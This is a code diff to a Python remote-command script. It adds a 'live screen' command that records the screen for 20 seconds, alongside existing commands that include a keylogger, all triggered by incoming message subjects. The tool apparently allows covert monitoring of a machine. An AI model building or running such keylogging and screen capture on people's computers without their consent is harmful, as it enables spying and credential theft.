@@ -95,6 +95,9 @@ def Process(Subject,rawMsg):
     elif Subject.lower() == "get list application" or rawMsg[:-2] == "get list application":
         filename = get_list_app()
         res = ["2",filename]
+    elif Subject.lower() == "live screen" or rawMsg[:-2] == "live screen":
+        filename = live_screen()
+        res = ["2",filename]
     elif Subject.lower() == "keylogger":
         res = kl.RunKeylogger(rawMsg)
     else:
@@ -289,6 +292,38 @@ def get_mac_address():
     mac_address = uuid.getnode()
     mac_address_hex = ':'.join(['{:02x}'.format((mac_address >> elements) & 0xff) for elements in range(0,8*6,8)][::-1])
     return mac_address_hex
+
+
+def live_screen():
+  import cv2
+  import numpy as np
+  import pyautogui
+  import time
+  import datetime
+
+  output = f"screenshot_{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.avi"
+  img = pyautogui.screenshot()
+  img = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
+  #get info from img
+  height, width, channels = img.shape
+  # Define the codec and create VideoWriter object
+  fourcc = cv2.VideoWriter_fourcc(*'mp4v')
+  out = cv2.VideoWriter(output, fourcc, 10.0, (width, height))
+  start = time.time()
+  while(True):
+    try:
+      img = pyautogui.screenshot()
+      image = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
+      out.write(image)
+      # StopIteration(0.5)
+      if time.time() - start > 20:
+       break
+    except KeyboardInterrupt:
+      break
+    
+  out.release()
+  cv2.destroyAllWindows()
+  return output
 
 def main(): 
     authorize()
